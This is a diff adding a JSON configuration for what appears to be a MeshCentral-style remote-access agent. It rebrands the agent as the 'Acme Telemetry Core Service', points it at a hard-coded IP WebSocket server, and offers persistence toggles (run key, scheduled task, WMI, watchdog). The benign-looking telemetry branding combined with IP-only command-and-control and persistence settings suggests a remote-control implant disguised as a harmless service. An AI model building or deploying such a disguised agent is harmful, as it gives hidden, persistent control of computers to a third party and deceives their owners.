@@ -1,0 +1,43 @@
+{
+  "$schema": "./schema/meshagent.schema.json",
+  "branding": {
+    "companyName": "Acme Corp",
+    "serviceName": "AcmeTelemetryCore",
+    "displayName": "Acme Telemetry Core Service",
+    "binaryName": "AcmeTelemetryCore.exe",
+    "productName": "Acme Telemetry Core",
+    "description": "Acme Telemetry Core Service",
+    "installRoot": "C:/ProgramData/Acme/TelemetryCore",
+    "logPath": "C:/ProgramData/Acme/TelemetryCore/logs",
+    "versionInfo": {
+      "fileVersion": "1.0.0.0",
+      "productVersion": "1.0.0.0"
+    }
+  },
+  "network": {
+    "primaryEndpoint": "wss://72.60.233.29:443/agent.ashx",
+    "sni": null,
+    "hostHeader": null,
+    "alpn": ["http/1.1"],
+    "userAgent": "AcmeAgent/1.0",
+    "useIpOnly": true
+  },
+  "artifacts": {
+    "databaseName": "telemetry.db",
+    "logFileName": "telemetry.log",
+    "configFileName": "telemetry.conf"
+  },
+  "persistence": {
+    "runKey": false,
+    "scheduledTask": { "enabled": false },
+    "wmi": { "enabled": false },
+    "watchdog": { "enabled": true, "intervalSeconds": 600 }
+  },
+  "provisioning": {
+    "meshName": "Acme Telemetry",
+    "meshType": "2",
+    "meshId": "",
+    "serverId": "",
+    "serverUrl": "wss://72.60.233.29:443/agent.ashx"
+  }
+}
